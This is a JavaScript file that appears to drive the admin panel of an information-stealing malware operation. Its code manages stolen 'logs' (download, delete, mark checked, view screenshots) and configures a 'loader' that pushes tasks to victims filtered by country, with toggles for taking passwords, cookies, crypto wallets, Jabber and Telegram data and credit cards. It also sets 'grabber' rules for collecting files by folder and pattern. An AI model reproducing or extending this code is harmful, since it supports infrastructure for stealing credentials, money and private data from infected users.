	document.addEventListener("DOMContentLoaded", function(){
			if($.cookie("nightmode")=="true"){
	document.getElementById('style').href = 'css/darkstyle.css';
	document.getElementById('nmode').checked=true;
	}else{
		document.getElementById('style').href = 'css/style.css';
	}
	});
	$(document).ready(function() {
		$(".form-check .form-check-label,.form-radio .form-check-label").not(".todo-form-check .form-check-label").append('<i class="input-helper"></i>');
		if($("#settingsRow input[name=grabber").prop('checked')) $("#grabberHide").show();
		$("#settingsRow input[name=grabber").change(function(){
							$("#grabberHide").toggle();
							});
		$(window).scroll(function() {
		if(window.matchMedia('(min-width: 992px)').matches) {
			var header = '.navbar.horizontal-layout';
			if ($(window).scrollTop() >= 100) {
				$(header).addClass('fixed-on-scroll');
			} else {
				$(header).removeClass('fixed-on-scroll');
			}
		}
		});
	});
	function nightMode(){
		var sess = $.cookie("nightmode");
		var checkbox = document.getElementById('nmode');
		if(sess!="true"){
			if(checkbox.checked){
			$.cookie("nightmode","true");
			document.getElementById('style').href = 'css/darkstyle.css';
			}else{
				$.cookie("nightmode","false");
			}
		}else{
			if(!checkbox.checked){
				$.cookie("nightmode","false");
			document.getElementById('style').href = 'css/style.css';
			}else{
				$.cookie("nightmode","true");
			}
		}
	}
	function search(){
		$("#logs-listing tbody").html("");
		$(".table input").remove();
		var formSearch = $('.form-search').serialize();
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"search=true&"+formSearch,
			  success:function(body){
				  $('table').DataTable().destroy();
				  $("#logs-listing tbody").html(body);
				  $("#totalCount").text($("#counter").text());
				  $("#counter").remove();
				  InitTable();
			  },
			  error:function(){
					alert("error");
			  }  
		  });
	}
	function submitSettings(){
		var settingsForm = $('#settingsRow').serialize();
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"submit=settings&"+settingsForm,
			  success:function(){
				  alert("ok");
			  },
			  error:function(){
					alert("error");
			  } 
		  });
	}
	function showSettings(){
		var element  = document.getElementById("addRule");
		if(element.style.display=="none"){
			element.style.display = "";
		}else{
			element.style.display = "none";
		}
	}
	function updateLoader(){
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"update=loader",
			  success:function(body){
				  $(".table tbody").html(body);
			  } 
		  });
		
	}
	function submitLoader(){
		var id = $("form input[name=edit").val();
		var name = $("form input[name=name").val();
		var preset = $("form select[name=preset").val();
		var count = $("form input[name=count").val();
		var country = $("form input[name=country").val();
		var task = $("form input[name=task").val();
		var pass = $("form input[name=pass").prop("checked");
		var cookie = $("form input[name=cookie").prop("checked");
		var wallet = $("form input[name=wallet").prop("checked");
		var jabb = $("form input[name=jabb").prop("checked");
		var tg = $("form input[name=tg").prop("checked");
		var cc = $("form input[name=cc").prop("checked");
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"submit=loader&id="+id+"&name="+name+"&preset="+preset+"&count="+count+"&country="+country+"&task="+task+"&pass="+pass+"&cookie="+cookie+"&wallet="+wallet+"&jabb="+jabb+"&tg="+tg+"&cc="+cc,
			  success:function(){
				  $(':input','form')
					  .not(':button, :submit, :reset, select')
					  .val('')
					  .prop('checked', false)
				  updateLoader();
			  },
			  error:function(){
					alert("error");
			  }  
		  });
	}
	function editLoader(id){
		$("form input[name=edit").val(id);
		$("form input[name=name").val($("#task"+id+" th").eq(2).html());
		$("form input[name=count").val($("#task"+id+" th").eq(4).text());
		$("form input[name=country").val($("#task"+id+" th").eq(5).text());
		$("form input[name=task").val($("#task"+id+" th").eq(6).text());
		scrollTo(0,$("form").offset().top);
	}
	function deleteLoader(id){
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"delete=loader&id="+id,
			  success:function(){
				  updateLoader();
			  },
			  error:function(){
					alert("error");
			  }  
		  });
	}
	function updateGrabber(){
	$.ajax({
		  type:"POST",
		  url:"action.php",
		  data:"update=grabber",
		  success:function(body){
			  $("#grabberTable tbody").html(body);
		  } 
	  });
	}
	function submitGrabber(){
		var id = $("#addRule input[name=editGrabber").val();
		var name = $("#addRule input[name=name").val();
		var folder = $("#addRule input[name=folder").val();
		var pattern = $("#addRule input[name=pattern").val();
		var exception = $("#addRule input[name=exception").val();
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"submit=grabber&id="+id+"&name="+name+"&folder="+folder+"&pattern="+pattern+"&exception="+exception,
			  success:function(){
				$(':input','#addRule')
				  .not(':button, :submit, :reset, select')
				  .val('')
				  .prop('checked', false)
				  updateGrabber();
			  },
			  error:function(){
					alert("error");
			  }  
		  });
	}
	function editGrabber(id){
		$("#addRule input[name=editGrabber").val(id);
		$("#addRule input[name=name").val($("#grabber"+id+" td").eq(0).text());
		$("#addRule input[name=folder").val($("#grabber"+id+" td").eq(1).text());
		$("#addRule input[name=pattern").val($("#grabber"+id+" td").eq(2).text());
		$("#addRule input[name=exception").val($("#grabber"+id+" td").eq(3).text());
		$("#addRule").show('slow');
		scrollTo(0,$("#addRule").offset().top);
	}
	function deleteGrabber(id){
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"delete=grabber&id="+id,
			  success:function(){
				  updateGrabber();
			  },
			  error:function(){
					alert("error");
			  }  
		  });
	}
	function updatePreset(){
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"update=preset",
			  success:function(body){
				  $("#presetTable tbody").html(body);
			  },
			  error:function(){
					alert("error");
			  }  
		  });
	}
	function submitPreset(){
		var id = $("form input[name=editPreset").val();
		var name = $("#presets input[name=name").val();
		var services = $("#presets textarea[name=services").val();
		var color = $("#presets select[name=color").val();
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"submit=preset&id="+id+"&name="+name+"&services="+services+"&color="+color,
			  success:function(){
				  $(':input','#presets')
					  .not(':button, :submit, :reset, select')
					  .val('')
					  .prop('checked', false)
				  updatePreset()
			  },
			  error:function(){
					alert("error");
			  }  
		  });
	}
	function editPreset(id){
		$("#presets input[name=editPreset").val(id);
		$("#presets input[name=name").val($("#preset"+id+" td").eq(0).text().replace("#",""));
		$("#presets textarea[name=services").val($("#preset"+id+" td").eq(1).text());
		$("#addPreset").show('slow');
		scrollTo(0,$("#addPreset").offset().top);
	}
	function deletePreset(id){
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"delete=preset&id="+id,
			  success:function(){
				  updatePreset();
			  },
			  error:function(){
					alert("error");
			  }  
		  });
	}
	function settingsPage(){
		updatePreset();
		updateGrabber();
		$(".form-check .form-check-label").not(".todo-form-check .form-check-label").append('<i class="input-helper"></i>');
		
	}
	function downloadFile(id){
		var type="log";
		if(id.indexOf(',')>-1) type="logs";
		if(id=="all" || id=="unchecked") type="logs"
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"download="+type+"&id="+id,
			  success:function(body){
				  window.location=body;
				  },
			  error:function(){
				  alert("Error while creating archive");
			  }
		  });
	  }
	function deleteTable(id){
		  var idArray=[];
	if(id.indexOf(",")>-1){
		idArray = id.split(",")
	}else{ 
		idArray[0]=id;
	}
		  $.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"delete=log&id="+id,
			  success:function(){
				  for(var i=0;i<idArray.length;i++){
				  if(/[0-9].*?/.test(id)){
						console.log(id);
						$("table").DataTable().rows($('#'+idArray[i]+'table')).remove().draw();
				  }else{
					  alert("ok");
				  }
				  }
			  }  
		  });
	  }
	  function markAsChecked(id){
		  $.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"checked="+id,
			  success:function(){
				  $("#"+id+"table td button").removeClass("btn-danger")[0];
				  $("#"+id+"table td button").addClass("btn-success")[0];
			  } 
		  });
	  }
	  function changeComment(id){
		  var text=$("#"+id+"table input[name=comment]").val();
		   $.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"comment="+id+"&text="+text,
			  success:function(){
				  alert("Success");
			  } 
		  });
	  }
	  function viewInfo(type,id){
			var win = window.open('viewer.php?'+type+"="+id, '_blank', "left="+(screen.width/2-screen.width/3/2)+",top="+(screen.height/2-screen.height/3/2)+",width=+"+screen.width/3+",height="+screen.height/3+",location=no");
			win.focus();
	  }
	  function downloadSelected(){
		  var id;
		  var count = $("table").DataTable().rows( { selected: true } ).ids().count();
			id= $("table").DataTable().rows( { selected: true } ).ids()[0].replace("table","");
			for(var i=1;i<count;i++){
				id=id+","+$("table").DataTable().rows( { selected: true } ).ids()[i].replace("table","");
			}
		  downloadFile(id);
	  }
	  function deleteSelected(){
		  var id;
		  var count = $("table").DataTable().rows( { selected: true } ).ids().count();
			id= $("table").DataTable().rows( { selected: true } ).ids()[0].replace("table","");
			for(var i=1;i<count;i++){
				id=id+","+$("table").DataTable().rows( { selected: true } ).ids()[i].replace("table","");
			}
		  deleteTable(id);
	  }
	  function drawTable(){
		$.ajax({
			  type:"POST",
			  url:"action.php",
			  data:"main_page",
			  success:function(body){
				  $('table').DataTable().destroy();
				  $("#logs-listing tbody").html(body);
				  $("#totalCount").text($("#counter").text());
				  $("#counter").remove();
				  InitTable();
			  } 
		  });
	}
	function InitTable(){
			$('table').DataTable({
				  "searching": false,
				  "select": {
					style: 'os',
					className: "table-selectedItem"
					},
				  "columns": [
					{ "orderable": false },
					{ "orderable": false },,
					null,
					null,
					null,
					{ "orderable": false },
					{ "orderable": false },
					{ "orderable": false },
				  ]
				});
			$('.image-link').viewbox({
			setTitle: true,
			margin: 50,
			resizeDuration: 300,
			openDuration: 200,
			closeDuration: 200,
			closeButton: true,
			navButtons: false,
			closeOnSideClick: true,
			nextOnContentClick: false
			});
	}
	function showSettings(){
		$("#addRule").toggle('slow');
	}
	function showPresets(){
		$("#addPreset").toggle('slow');
	}